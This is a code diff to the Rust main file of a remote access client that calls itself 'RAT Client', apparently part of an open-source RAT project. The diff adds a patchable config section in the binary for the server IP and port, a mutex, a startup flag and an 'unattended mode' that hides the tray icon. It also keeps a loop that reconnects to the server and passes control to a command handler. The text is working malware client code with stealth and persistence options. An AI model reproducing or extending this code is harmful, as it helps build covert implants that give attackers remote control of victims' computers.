@@ -1,3 +1,7 @@
+#[no_mangle]
+#[link_section = ".zzz"]
+static CONFIG: [u8; 1024] = [0; 1024];
+
 use std::net::TcpStream;
 use std::path::PathBuf;
 use std::process::Child;
@@ -7,22 +11,23 @@ use std::thread::sleep;
 pub mod features;
 pub mod handler;
 pub mod service;
-pub mod settings;
 
+use features::tray_icon;
 use handler::handle_command;
-use common::buffers::read_buffer;
+use common::{buffers::read_buffer, ClientConfig};
 use rand::{ rngs::OsRng, Rng };
 use rsa::pkcs8::DecodePublicKey;
 use rsa::Pkcs1v15Encrypt;
 use std::process;
 
+use crate::features::tray_icon::TrayIcon;
 use common::commands::{Command, EncryptionResponseData};
 use common::buffers::write_buffer;
 
-use rand::{ SeedableRng};
+use rand::SeedableRng;
 use rand_chacha::ChaCha20Rng;
 
-use rsa::{RsaPublicKey, RsaPrivateKey, traits::PaddingScheme};
+use rsa::RsaPublicKey;
 
 fn handle_server(
     mut read_stream: TcpStream,
@@ -175,19 +180,57 @@ fn handle_server(
 }
 
 fn main() {
-    service::mutex::mutex_lock();
+    let mut config: ClientConfig = ClientConfig {
+        ip: "".to_string(),
+        port: "1337".to_string(),
+        mutex_enabled: true,
+        mutex: "TEST123".to_string(),
+        unattended_mode: false,
+        startup: false,
+    };
+
+    let config_link_sec: Result<ClientConfig, rmp_serde::decode::Error> = rmp_serde::from_read(std::io::Cursor::new(&CONFIG));
+
+    if let Some(config_link_sec) = config_link_sec.as_ref().ok() {
+        config = config_link_sec.clone();
+    }
+
+    if config.mutex_enabled {
+        service::mutex::mutex_lock(&config.mutex);
+    }
+
     let is_connected = Arc::new(Mutex::new(false));
 
+    let tray_icon = Arc::new(Mutex::new(TrayIcon::new()));
+
+    if !config.unattended_mode
+    {
+        tray_icon.lock().unwrap().show();
+    }
+
     loop {
+        let config_clone = config.clone();
         let is_connected_clone = is_connected.clone();
+        let tray_icon_clone = tray_icon.clone();
         if *is_connected_clone.lock().unwrap() {
+            if !config.unattended_mode
+            {
+                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
+            }
             sleep(std::time::Duration::from_secs(5));
             continue;
         }
+        else {
+            if !config.unattended_mode
+            {
+                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
+            }
+        }
+
 
         std::thread::spawn(move || {
             println!("Connecting to server...");
-            let stream = TcpStream::connect(format!("{}:{}", settings::IP, settings::PORT));
+            let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));
             if let Ok(str) = stream {
                 *is_connected_clone.lock().unwrap() = true;
                 handle_server(
